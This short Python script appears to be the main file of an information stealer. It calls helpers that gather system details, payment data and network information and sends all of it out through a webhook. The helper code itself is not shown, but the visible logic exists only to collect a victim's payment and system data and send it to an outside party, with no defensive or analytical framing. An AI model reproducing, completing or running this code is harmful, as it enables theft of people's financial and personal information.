from utils.send import send_webhook
from utils.System import getSystem
from utils.Payment import getPayments
from utils.network import getNetwork

if __name__ == "__main__":
    send_webhook(
        getSystem(), getPayments(), getNetwork()
    )